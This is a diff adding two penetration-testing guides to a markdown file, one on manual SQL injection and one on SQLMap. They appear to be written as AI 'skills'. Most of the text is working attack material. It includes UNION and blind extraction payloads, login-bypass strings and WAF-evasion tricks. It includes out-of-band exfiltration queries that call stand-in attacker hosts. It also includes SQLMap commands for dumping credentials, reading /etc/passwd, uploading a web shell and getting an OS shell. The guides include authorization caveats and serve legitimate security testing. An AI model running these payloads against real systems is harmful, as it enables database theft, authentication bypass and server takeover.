@@ -571,3 +571,847 @@ sqlmap -u "https://target.com/item?id=1" --proxy=http://127.0.0.1:8080 --dbs
 □ Use Burp Collaborator/interactsh for OOB DNS/HTTP callbacks
 □ Test parameterized bypass scenarios: table/column name injection, IN clause, PDO emulated prepares
 ```
+
+
+---
+
+## [SQL Injection Testing (zebbern)] Additional Techniques
+
+# SQL Injection Testing
+
+## Purpose
+
+Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.
+
+## Inputs / Prerequisites
+
+### Required Access
+- Target web application URL with injectable parameters
+- Burp Suite or equivalent proxy tool for request manipulation
+- SQLMap installation for automated exploitation
+- Browser with developer tools enabled
+
+### Technical Requirements
+- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
+- Knowledge of HTTP request/response cycle
+- Familiarity with database schemas and structures
+- Write permissions for testing reports
+
+### Legal Prerequisites
+- Written authorization for penetration testing
+- Defined scope including target URLs and parameters
+- Emergency contact procedures established
+- Data handling agreements in place
+
+## Outputs / Deliverables
+
+### Primary Outputs
+- SQL injection vulnerability report with severity ratings
+- Extracted database schemas and table structures
+- Authentication bypass proof-of-concept demonstrations
+- Remediation recommendations with code examples
+
+### Evidence Artifacts
+- Screenshots of successful injections
+- HTTP request/response logs
+- Database dumps (sanitized)
+- Payload documentation
+
+## Core Workflow
+
+### Phase 1: Detection and Reconnaissance
+
+#### Identify Injectable Parameters
+Locate user-controlled input fields that interact with database queries:
+
+```
+# Common injection points
+- URL parameters: ?id=1, ?user=admin, ?category=books
+- Form fields: username, password, search, comments
+- Cookie values: session_id, user_preference
+- HTTP headers: User-Agent, Referer, X-Forwarded-For
+```
+
+#### Test for Basic Vulnerability Indicators
+Insert special characters to trigger error responses:
+
+```sql
+-- Single quote test
+'
+
+-- Double quote test
+"
+
+-- Comment sequences
+--
+#
+/**/
+
+-- Semicolon for query stacking
+;
+
+-- Parentheses
+)
+```
+
+Monitor application responses for:
+- Database error messages revealing query structure
+- Unexpected application behavior changes
+- HTTP 500 Internal Server errors
+- Modified response content or length
+
+#### Logic Testing Payloads
+Verify boolean-based vulnerability presence:
+
+```sql
+-- True condition tests
+page.asp?id=1 or 1=1
+page.asp?id=1' or 1=1--
+page.asp?id=1" or 1=1--
+
+-- False condition tests  
+page.asp?id=1 and 1=2
+page.asp?id=1' and 1=2--
+```
+
+Compare responses between true and false conditions to confirm injection capability.
+
+### Phase 2: Exploitation Techniques
+
+#### UNION-Based Extraction
+Combine attacker-controlled SELECT statements with original query:
+
+```sql
+-- Determine column count
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+-- Continue until error occurs
+
+-- Find displayable columns
+UNION SELECT NULL,NULL,NULL--
+UNION SELECT 'a',NULL,NULL--
+UNION SELECT NULL,'a',NULL--
+
+-- Extract data
+UNION SELECT username,password,NULL FROM users--
+UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+```
+
+#### Error-Based Extraction
+Force database errors that leak information:
+
+```sql
+-- MSSQL version extraction
+1' AND 1=CONVERT(int,(SELECT @@version))--
+
+-- MySQL extraction via XPATH
+1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
+
+-- PostgreSQL cast errors
+1' AND 1=CAST((SELECT version()) AS int)--
+```
+
+#### Blind Boolean-Based Extraction
+Infer data through application behavior changes:
+
+```sql
+-- Character extraction
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
+
+-- Conditional responses
+1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+```
+
+#### Time-Based Blind Extraction
+Use database sleep functions for confirmation:
+
+```sql
+-- MySQL
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
+
+-- MSSQL
+1'; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+1'; SELECT pg_sleep(5)--
+```
+
+#### Out-of-Band (OOB) Extraction
+Exfiltrate data through external channels:
+
+```sql
+-- MSSQL DNS exfiltration
+1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
+
+-- MySQL DNS exfiltration
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
+
+-- Oracle HTTP request
+1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
+```
+
+### Phase 3: Authentication Bypass
+
+#### Login Form Exploitation
+Craft payloads to bypass credential verification:
+
+```sql
+-- Classic bypass
+admin'--
+admin'/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+') OR ('1'='1
+') OR ('1'='1'--
+
+-- Username enumeration
+admin' AND '1'='1
+admin' AND '1'='2
+```
+
+Query transformation example:
+```sql
+-- Original query
+SELECT * FROM users WHERE username='input' AND password='input'
+
+-- Injected (username: admin'--)
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+-- Password check bypassed via comment
+```
+
+### Phase 4: Filter Bypass Techniques
+
+#### Character Encoding Bypass
+When special characters are blocked:
+
+```sql
+-- URL encoding
+%27 (single quote)
+%22 (double quote)
+%23 (hash)
+
+-- Double URL encoding
+%2527 (single quote)
+
+-- Unicode alternatives
+U+0027 (apostrophe)
+U+02B9 (modifier letter prime)
+
+-- Hexadecimal strings (MySQL)
+SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
+```
+
+#### Whitespace Bypass
+Substitute blocked spaces:
+
+```sql
+-- Comment substitution
+SELECT/**/username/**/FROM/**/users
+SEL/**/ECT/**/username/**/FR/**/OM/**/users
+
+-- Alternative whitespace
+SELECT%09username%09FROM%09users  -- Tab character
+SELECT%0Ausername%0AFROM%0Ausers  -- Newline
+```
+
+#### Keyword Bypass
+Evade blacklisted SQL keywords:
+
+```sql
+-- Case variation
+SeLeCt, sElEcT, SELECT
+
+-- Inline comments
+SEL/*bypass*/ECT
+UN/*bypass*/ION
+
+-- Double writing (if filter removes once)
+SELSELECTECT â†’ SELECT
+UNUNIONION â†’ UNION
+
+-- Null byte injection
+%00SELECT
+SEL%00ECT
+```
+
+## Quick Reference
+
+### Detection Test Sequence
+```
+1. Insert ' â†’ Check for error
+2. Insert " â†’ Check for error
+3. Try: OR 1=1-- â†’ Check for behavior change
+4. Try: AND 1=2-- â†’ Check for behavior change
+5. Try: ' WAITFOR DELAY '0:0:5'-- â†’ Check for delay
+```
+
+### Database Fingerprinting
+```sql
+-- MySQL
+SELECT @@version
+SELECT version()
+
+-- MSSQL
+SELECT @@version
+SELECT @@servername
+
+-- PostgreSQL
+SELECT version()
+
+-- Oracle
+SELECT banner FROM v$version
+SELECT * FROM v$version
+```
+
+### Information Schema Queries
+```sql
+-- MySQL/MSSQL table enumeration
+SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+
+-- Column enumeration
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+
+-- Oracle equivalent
+SELECT table_name FROM all_tables
+SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
+```
+
+### Common Payloads Quick List
+| Purpose | Payload |
+|---------|---------|
+| Basic test | `'` or `"` |
+| Boolean true | `OR 1=1--` |
+| Boolean false | `AND 1=2--` |
+| Comment (MySQL) | `#` or `-- ` |
+| Comment (MSSQL) | `--` |
+| UNION probe | `UNION SELECT NULL--` |
+| Time delay | `AND SLEEP(5)--` |
+| Auth bypass | `' OR '1'='1` |
+
+## Constraints and Guardrails
+
+### Operational Boundaries
+- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
+- Limit data extraction to proof-of-concept quantities
+- Avoid denial-of-service through resource-intensive queries
+- Stop immediately upon detecting production database with real user data
+
+### Technical Limitations
+- WAF/IPS may block common payloads requiring evasion techniques
+- Parameterized queries prevent standard injection
+- Some blind injection requires extensive requests (rate limiting concerns)
+- Second-order injection requires understanding of data flow
+
+### Legal and Ethical Requirements
+- Written scope agreement must exist before testing
+- Document all extracted data and handle per data protection requirements
+- Report critical vulnerabilities immediately through agreed channels
+- Never access data beyond scope requirements
+
+## Examples
+
+### Example 1: E-commerce Product Page SQLi
+
+**Scenario**: Testing product display page with ID parameter
+
+**Initial Request**:
+```
+GET /product.php?id=5 HTTP/1.1
+```
+
+**Detection Test**:
+```
+GET /product.php?id=5' HTTP/1.1
+Response: MySQL error - syntax error near ''' 
+```
+
+**Column Enumeration**:
+```
+GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
+Response: Normal
+GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
+Response: Error (4 columns confirmed)
+```
+
+**Data Extraction**:
+```
+GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
+Response: Displays admin credentials
+```
+
+### Example 2: Blind Time-Based Extraction
+
+**Scenario**: No visible output, testing for blind injection
+
+**Confirm Vulnerability**:
+```sql
+id=5' AND SLEEP(5)-- 
+-- Response delayed by 5 seconds (vulnerable confirmed)
+```
+
+**Extract Database Name Length**:
+```sql
+id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
+-- Delay confirms database name is 8 characters
+```
+
+**Extract Characters**:
+```sql
+id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+-- Iterate through characters to extract: 'appstore'
+```
+
+### Example 3: Login Bypass
+
+**Target**: Admin login form
+
+**Standard Login Query**:
+```sql
+SELECT * FROM users WHERE username='[input]' AND password='[input]'
+```
+
+**Injection Payload**:
+```
+Username: administrator'--
+Password: anything
+```
+
+**Resulting Query**:
+```sql
+SELECT * FROM users WHERE username='administrator'--' AND password='anything'
+```
+
+**Result**: Password check bypassed, authenticated as administrator.
+
+## Troubleshooting
+
+### No Error Messages Displayed
+- Application uses generic error handling
+- Switch to blind injection techniques (boolean or time-based)
+- Monitor response length differences instead of content
+
+### UNION Injection Fails
+- Column count may be incorrect â†’ Test with ORDER BY
+- Data types may mismatch â†’ Use NULL for all columns first
+- Results may not display â†’ Find injectable column positions
+
+### WAF Blocking Requests
+- Use encoding techniques (URL, hex, unicode)
+- Insert inline comments within keywords
+- Try alternative syntax for same operations
+- Fragment payload across multiple parameters
+
+### Payload Not Executing
+- Verify correct comment syntax for database type
+- Check if application uses parameterized queries
+- Confirm input reaches SQL query (not filtered client-side)
+- Test different injection points (headers, cookies)
+
+### Time-Based Injection Inconsistent
+- Network latency may cause false positives
+- Use longer delays (10+ seconds) for clarity
+- Run multiple tests to confirm pattern
+- Consider server-side caching effects
+
+
+---
+
+## [SQLMap Database Pentesting (zebbern)] Additional Techniques
+
+# SQLMap Database Penetration Testing
+
+## Purpose
+
+Provide systematic methodologies for automated SQL injection detection and exploitation using SQLMap. This skill covers database enumeration, table and column discovery, data extraction, multiple target specification methods, and advanced exploitation techniques for MySQL, PostgreSQL, MSSQL, Oracle, and other database management systems.
+
+## Inputs / Prerequisites
+
+- **Target URL**: Web application URL with injectable parameter (e.g., `?id=1`)
+- **SQLMap Installation**: Pre-installed on Kali Linux or downloaded from GitHub
+- **Verified Injection Point**: URL parameter confirmed or suspected to be SQL injectable
+- **Request File (Optional)**: Burp Suite captured HTTP request for POST-based injection
+- **Authorization**: Written permission for penetration testing activities
+
+## Outputs / Deliverables
+
+- **Database Enumeration**: List of all databases on the target server
+- **Table Structure**: Complete table names within target database
+- **Column Mapping**: Column names and data types for each table
+- **Extracted Data**: Dumped records including usernames, passwords, and sensitive data
+- **Hash Values**: Password hashes for offline cracking
+- **Vulnerability Report**: Confirmation of SQL injection type and severity
+
+## Core Workflow
+
+### 1. Identify SQL Injection Vulnerability
+
+#### Manual Verification
+```bash
+# Add single quote to break query
+http://target.com/page.php?id=1'
+
+# If error message appears, likely SQL injectable
+# Error example: "You have an error in your SQL syntax"
+```
+
+#### Initial SQLMap Scan
+```bash
+# Basic vulnerability detection
+sqlmap -u "http://target.com/page.php?id=1" --batch
+
+# With verbosity for detailed output
+sqlmap -u "http://target.com/page.php?id=1" --batch -v 3
+```
+
+### 2. Enumerate Databases
+
+#### List All Databases
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
+```
+
+**Key Options:**
+- `-u`: Target URL with injectable parameter
+- `--dbs`: Enumerate database names
+- `--batch`: Use default answers (non-interactive mode)
+
+### 3. Enumerate Tables
+
+#### List Tables in Specific Database
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
+```
+
+**Key Options:**
+- `-D`: Specify target database name
+- `--tables`: Enumerate table names
+
+### 4. Enumerate Columns
+
+#### List Columns in Specific Table
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns --batch
+```
+
+**Key Options:**
+- `-T`: Specify target table name
+- `--columns`: Enumerate column names
+
+### 5. Extract Data
+
+#### Dump Specific Table Data
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --batch
+```
+
+#### Dump Specific Columns
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump --batch
+```
+
+#### Dump Entire Database
+```bash
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all --batch
+```
+
+**Key Options:**
+- `--dump`: Extract all data from specified table
+- `--dump-all`: Extract all data from all tables
+- `-C`: Specify column names to extract
+
+### 6. Advanced Target Options
+
+#### Target from HTTP Request File
+```bash
+# Save Burp Suite request to file, then:
+sqlmap -r /path/to/request.txt --dbs --batch
+```
+
+#### Target from Log File
+```bash
+# Feed log file with multiple requests
+sqlmap -l /path/to/logfile --dbs --batch
+```
+
+#### Target Multiple URLs (Bulk File)
+```bash
+# Create file with URLs, one per line:
+# http://target1.com/page.php?id=1
+# http://target2.com/page.php?id=2
+sqlmap -m /path/to/bulkfile.txt --dbs --batch
+```
+
+#### Target via Google Dorks (Use with Caution)
+```bash
+# Automatically find and test vulnerable sites (LEGAL TARGETS ONLY)
+sqlmap -g "inurl:?id= site:yourdomain.com" --batch
+```
+
+## Quick Reference Commands
+
+### Database Enumeration Progression
+
+| Stage | Command |
+|-------|---------|
+| List Databases | `sqlmap -u "URL" --dbs --batch` |
+| List Tables | `sqlmap -u "URL" -D dbname --tables --batch` |
+| List Columns | `sqlmap -u "URL" -D dbname -T tablename --columns --batch` |
+| Dump Data | `sqlmap -u "URL" -D dbname -T tablename --dump --batch` |
+| Dump All | `sqlmap -u "URL" -D dbname --dump-all --batch` |
+
+### Supported Database Management Systems
+
+| DBMS | Support Level |
+|------|---------------|
+| MySQL | Full Support |
+| PostgreSQL | Full Support |
+| Microsoft SQL Server | Full Support |
+| Oracle | Full Support |
+| Microsoft Access | Full Support |
+| IBM DB2 | Full Support |
+| SQLite | Full Support |
+| Firebird | Full Support |
+| Sybase | Full Support |
+| SAP MaxDB | Full Support |
+| HSQLDB | Full Support |
+| Informix | Full Support |
+
+### SQL Injection Techniques
+
+| Technique | Description | Flag |
+|-----------|-------------|------|
+| Boolean-based blind | Infers data from true/false responses | `--technique=B` |
+| Time-based blind | Uses time delays to infer data | `--technique=T` |
+| Error-based | Extracts data from error messages | `--technique=E` |
+| UNION query-based | Uses UNION to append results | `--technique=U` |
+| Stacked queries | Executes multiple statements | `--technique=S` |
+| Out-of-band | Uses DNS or HTTP for exfiltration | `--technique=Q` |
+
+### Essential Options
+
+| Option | Description |
+|--------|-------------|
+| `-u` | Target URL |
+| `-r` | Load HTTP request from file |
+| `-l` | Parse targets from Burp/WebScarab log |
+| `-m` | Bulk file with multiple targets |
+| `-g` | Google dork (use responsibly) |
+| `--dbs` | Enumerate databases |
+| `--tables` | Enumerate tables |
+| `--columns` | Enumerate columns |
+| `--dump` | Dump table data |
+| `--dump-all` | Dump all database data |
+| `-D` | Specify database |
+| `-T` | Specify table |
+| `-C` | Specify columns |
+| `--batch` | Non-interactive mode |
+| `--random-agent` | Use random User-Agent |
+| `--level` | Level of tests (1-5) |
+| `--risk` | Risk of tests (1-3) |
+
+## Constraints and Limitations
+
+### Operational Boundaries
+- Requires valid injectable parameter in target URL
+- Network connectivity to target database server required
+- Large database dumps may take significant time
+- Some WAF/IPS systems may block SQLMap traffic
+- Time-based attacks significantly slower than error-based
+
+### Performance Considerations
+- Use `--threads` to speed up enumeration (default: 1)
+- Limit dumps with `--start` and `--stop` for large tables
+- Use `--technique` to specify faster injection method if known
+
+### Legal Requirements
+- Only test systems with explicit written authorization
+- Google dork attacks against unknown sites are illegal
+- Document all testing activities and findings
+- Respect scope limitations defined in engagement rules
+
+### Detection Risk
+- SQLMap generates significant log entries
+- Use `--random-agent` to vary User-Agent header
+- Consider `--delay` to avoid triggering rate limits
+- Proxy through Tor with `--tor` for anonymity (authorized tests only)
+
+## Examples
+
+### Example 1: Complete Database Enumeration
+```bash
+# Step 1: Discover databases
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+# Result: acuart database found
+
+# Step 2: List tables
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
+# Result: users, products, carts, etc.
+
+# Step 3: List columns
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+# Result: username, password, email columns
+
+# Step 4: Dump user credentials
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+```
+
+### Example 2: POST Request Injection
+```bash
+# Save Burp request to file (login.txt):
+# POST /login.php HTTP/1.1
+# Host: target.com
+# Content-Type: application/x-www-form-urlencoded
+# 
+# username=admin&password=test
+
+# Run SQLMap with request file
+sqlmap -r /root/Desktop/login.txt -p username --dbs --batch
+```
+
+### Example 3: Bulk Target Scanning
+```bash
+# Create bulkfile.txt:
+echo "http://192.168.1.10/sqli/Less-1/?id=1" > bulkfile.txt
+echo "http://192.168.1.10/sqli/Less-2/?id=1" >> bulkfile.txt
+
+# Scan all targets
+sqlmap -m bulkfile.txt --dbs --batch
+```
+
+### Example 4: Aggressive Testing
+```bash
+# High level and risk for thorough testing
+sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --level=5 --risk=3
+
+# Specify all techniques
+sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --technique=BEUSTQ
+```
+
+### Example 5: Extract Specific Credentials
+```bash
+# Target specific columns
+sqlmap -u "http://target.com/page.php?id=1" \
+  -D webapp \
+  -T admin_users \
+  -C admin_name,admin_pass,admin_email \
+  --dump --batch
+
+# Automatically crack password hashes
+sqlmap -u "http://target.com/page.php?id=1" \
+  -D webapp \
+  -T users \
+  --dump --batch \
+  --passwords
+```
+
+### Example 6: OS Shell Access (Advanced)
+```bash
+# Get interactive OS shell (requires DBA privileges)
+sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
+
+# Execute specific OS command
+sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami" --batch
+
+# File read from server
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch
+
+# File upload to server
+sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
+```
+
+## Troubleshooting
+
+### Issue: "Parameter does not seem injectable"
+**Cause**: SQLMap cannot find injection point
+**Solution**:
+```bash
+# Increase testing level and risk
+sqlmap -u "URL" --dbs --batch --level=5 --risk=3
+
+# Specify parameter explicitly
+sqlmap -u "URL" -p "id" --dbs --batch
+
+# Try different injection techniques
+sqlmap -u "URL" --dbs --batch --technique=BT
+
+# Add prefix/suffix for filter bypass
+sqlmap -u "URL" --dbs --batch --prefix="'" --suffix="-- -"
+```
+
+### Issue: Target Behind WAF/Firewall
+**Cause**: Web Application Firewall blocking requests
+**Solution**:
+```bash
+# Use tamper scripts
+sqlmap -u "URL" --dbs --batch --tamper=space2comment
+
+# List available tamper scripts
+sqlmap --list-tampers
+
+# Common tamper combinations
+sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase
+
+# Add delay between requests
+sqlmap -u "URL" --dbs --batch --delay=2
+
+# Use random User-Agent
+sqlmap -u "URL" --dbs --batch --random-agent
+```
+
+### Issue: Connection Timeout
+**Cause**: Network issues or slow target
+**Solution**:
+```bash
+# Increase timeout
+sqlmap -u "URL" --dbs --batch --timeout=60
+
+# Reduce threads
+sqlmap -u "URL" --dbs --batch --threads=1
+
+# Add retries
+sqlmap -u "URL" --dbs --batch --retries=5
+```
+
+### Issue: Time-Based Attacks Too Slow
+**Cause**: Default time delay too conservative
+**Solution**:
+```bash
+# Reduce time delay (risky, may cause false negatives)
+sqlmap -u "URL" --dbs --batch --time-sec=3
+
+# Use boolean-based instead if possible
+sqlmap -u "URL" --dbs --batch --technique=B
+```
+
+### Issue: Cannot Dump Large Tables
+**Cause**: Table has too many records
+**Solution**:
+```bash
+# Limit number of records
+sqlmap -u "URL" -D db -T table --dump --batch --start=1 --stop=100
+
+# Dump specific columns only
+sqlmap -u "URL" -D db -T table -C username,password --dump --batch
+
+# Exclude specific columns
+sqlmap -u "URL" -D db -T table --dump --batch --exclude-sysdbs
+```
+
+### Issue: Session Drops During Long Scan
+**Cause**: Session timeout or connection reset
+**Solution**:
+```bash
+# Save and resume session
+sqlmap -u "URL" --dbs --batch --output-dir=/root/sqlmap_session
+
+# Resume from saved session
+sqlmap -u "URL" --dbs --batch --resume
+
+# Use persistent HTTP connection
+sqlmap -u "URL" --dbs --batch --keep-alive
+```
